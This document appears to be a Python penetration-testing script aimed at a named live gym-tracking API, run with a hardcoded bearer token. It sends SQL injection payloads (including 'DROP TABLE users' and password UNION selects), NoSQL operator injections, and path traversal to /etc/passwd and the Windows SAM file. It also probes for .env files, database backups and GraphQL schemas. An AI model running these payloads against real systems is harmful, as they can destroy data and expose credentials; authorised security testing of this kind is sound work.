# -*- coding: utf-8 -*-
"""
Database Access & Injection Testing
Target: https://gym-api.algorynth.net
"""
import requests
import json
import sys

if sys.platform == 'win32':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

API_URL = "https://gym-api.algorynth.net"
TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo2LCJlbWFpbCI6InRlc3Rfc2VjdXJpdHlAZXhhbXBsZS5jb20iLCJpc3MiOiJneW0tdHJhY2tlci1hcGkiLCJleHAiOjE3Njc0Mzk0ODYsImlhdCI6MTc2NzM1MzA4Nn0.SJFr0yGvNspzbQktTDLB81Lb6DHsREXjcnUEbngUE1c"

print("="*80)
print("DATABASE ACCESS & INJECTION TESTING")
print("="*80)
print(f"Target: {API_URL}\n")

headers = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}
vulnerabilities = []

# Test 1: SQL Injection in GET parameters
print("[TEST 1] SQL Injection in GET Parameters")
print("-"*80)

sql_payloads = [
    "1' OR '1'='1",
    "1' UNION SELECT * FROM users--",
    "1'; DROP TABLE users--",
    "' OR 1=1--",
    "1' AND 1=0 UNION ALL SELECT password FROM users--"
]

for payload in sql_payloads:
    try:
        r = requests.get(f"{API_URL}/api/exercises/{payload}", headers=headers, timeout=3)
        
        if "sql" in r.text.lower() or "syntax" in r.text.lower() or "mysql" in r.text.lower():
            print(f"  🚨 VULNERABLE: SQL error exposed with payload: {payload[:30]}")
            vulnerabilities.append({"type": "SQL Injection", "endpoint": "/api/exercises", "payload": payload})
        elif r.status_code == 200 and len(r.text) > 100:
            print(f"  ⚠️  Suspicious: Large response with: {payload[:30]}")
            vulnerabilities.append({"type": "Possible SQL Injection", "endpoint": "/api/exercises", "payload": payload})
    except:
        pass

if not vulnerabilities:
    print("  ✅ SQL Injection blocked")

# Test 2: NoSQL Injection
print("\n[TEST 2] NoSQL Injection")
print("-"*80)

nosql_payloads = [
    {"$gt": ""},
    {"$ne": None},
    {"$regex": ".*"},
    {"$where": "1==1"}
]

try:
    for payload in nosql_payloads:
        r = requests.post(f"{API_URL}/api/exercises", 
                         json={"filter": payload}, 
                         headers=headers, 
                         timeout=3)
        
        if r.status_code == 200 and "exercises" in r.text.lower():
            print(f"  🚨 VULNERABLE: NoSQL injection with {payload}")
            vulnerabilities.append({"type": "NoSQL Injection", "payload": str(payload)})
            break
except:
    pass

if len([v for v in vulnerabilities if v['type'] == 'NoSQL Injection']) == 0:
    print("  ✅ NoSQL Injection blocked")

# Test 3: Direct Database Access
print("\n[TEST 3] Direct Database Access Attempts")
print("-"*80)

db_endpoints = [
    "/api/database",
    "/api/db",
    "/api/mysql",
    "/api/mongo",
    "/api/postgres",
    "/api/admin/database",
    "/api/phpmyadmin",
    "/api/adminer",
    "/.env",
    "/database.yml",
    "/config/database.yml"
]

for endpoint in db_endpoints:
    try:
        r = requests.get(f"{API_URL}{endpoint}", headers=headers, timeout=3)
        if r.status_code == 200:
            print(f"  🚨 FOUND: {endpoint} -> {r.status_code}")
            print(f"     Response: {r.text[:100]}")
            vulnerabilities.append({"type": "Direct DB Access", "endpoint": endpoint})
    except:
        pass

if len([v for v in vulnerabilities if v['type'] == 'Direct DB Access']) == 0:
    print("  ✅ No direct DB access found")

# Test 4: Path Traversal
print("\n[TEST 4] Path Traversal")
print("-"*80)

path_payloads = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "../../../app/database.db",
    "../../config/database.yml",
    "../.env"
]

for payload in path_payloads:
    try:
        r = requests.get(f"{API_URL}/api/files/{payload}", headers=headers, timeout=3)
        
        if r.status_code == 200:
            if "root:" in r.text or "[" in r.text or "DATABASE" in r.text:
                print(f"  🚨 VULNERABLE: Path traversal with {payload}")
                vulnerabilities.append({"type": "Path Traversal", "payload": payload})
    except:
        pass

if len([v for v in vulnerabilities if v['type'] == 'Path Traversal']) == 0:
    print("  ✅ Path traversal blocked")

# Test 5: DB Backup Files
print("\n[TEST 5] Database Backup Files")
print("-"*80)

backup_files = [
    "/backup.sql",
    "/dump.sql",
    "/database.sql",
    "/db.sql",
    "/backup/database.sql",
    "/backups/db.tar.gz",
    "/data/backup.db"
]

for file in backup_files:
    try:
        r = requests.get(f"{API_URL}{file}", timeout=3)
        if r.status_code == 200 and len(r.content) > 1000:
            print(f"  🚨 FOUND BACKUP: {file} ({len(r.content)} bytes)")
            vulnerabilities.append({"type": "DB Backup Exposed", "file": file})
    except:
        pass

if len([v for v in vulnerabilities if v['type'] == 'DB Backup Exposed']) == 0:
    print("  ✅ No backup files exposed")

# Test 6: GraphQL Introspection (DB Schema)
print("\n[TEST 6] GraphQL Introspection")
print("-"*80)

graphql_query = {
    "query": "{ __schema { types { name fields { name type { name } } } } }"
}

try:
    r = requests.post(f"{API_URL}/graphql", json=graphql_query, headers=headers, timeout=3)
    
    if r.status_code == 200 and "__schema" in r.text:
        print(f"  🚨 VULNERABLE: GraphQL introspection enabled")
        print(f"     Can see full DB schema!")
        vulnerabilities.append({"type": "GraphQL Introspection", "endpoint": "/graphql"})
except:
    print("  ✅ No GraphQL or introspection disabled")

# Test 7: Error-based Information Disclosure
print("\n[TEST 7] Error-based Information Disclosure")
print("-"*80)

try:
    # Invalid JSON
    r = requests.post(f"{API_URL}/api/exercises", 
                     data="invalid json", 
                     headers=headers, 
                     timeout=3)
    
    if any(keyword in r.text.lower() for keyword in ['database', 'mysql', 'postgres', 'mongo', 'sequelize', 'mongoose']):
        print(f"  🚨 DB info in error: {r.text[:150]}")
        vulnerabilities.append({"type": "DB Info Disclosure", "response": r.text[:200]})
    else:
        print(f"  ✅ Generic error messages")
except:
    pass

# Summary
print("\n" + "="*80)
print("INJECTION TEST SUMMARY")
print("="*80)

if vulnerabilities:
    print(f"\n🚨 FOUND {len(vulnerabilities)} VULNERABILITIES:\n")
    for v in vulnerabilities:
        print(f"  - {v['type']}")
        for key, val in v.items():
            if key != 'type':
                print(f"    {key}: {str(val)[:100]}")
else:
    print("\n✅ NO CRITICAL VULNERABILITIES FOUND")
    print("\nAPI appears secure against:")
    print("  - SQL Injection")
    print("  - NoSQL Injection") 
    print("  - Path Traversal")
    print("  - Direct DB Access")
    print("  - DB Backup Exposure")
    print("  - GraphQL Introspection")

# Save results
with open("injection_test_results.json", "w", encoding="utf-8") as f:
    json.dump({
        "target": API_URL,
        "total_vulnerabilities": len(vulnerabilities),
        "vulnerabilities": vulnerabilities
    }, f, indent=2, ensure_ascii=False)

print(f"\n📄 Results saved to: injection_test_results.json")
print("="*80)
